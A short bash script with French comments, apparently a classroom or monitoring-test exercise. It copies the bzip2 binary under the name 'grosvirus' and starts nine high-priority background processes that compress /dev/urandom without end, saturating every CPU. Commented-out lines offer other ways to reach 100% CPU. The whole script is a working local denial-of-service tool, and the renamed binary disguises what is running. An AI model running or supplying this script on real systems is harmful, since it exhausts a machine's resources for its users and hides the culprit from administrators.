#!/bin/bash

VIRUS='grosvirus'

p=$(which bzip2)
d=$(dirname $p)

cp $p $d/$VIRUS

# CPU 100%
#while true; do echo -n ""; done &
#stress -c 10
# Occuper tous les cpu
for i in {1..9}
do
  # Lancer dans un subshell pour empecher bash d'afficher les notif [pid] et Complété
  (nice -n -20 $VIRUS -9 < /dev/urandom &)
done
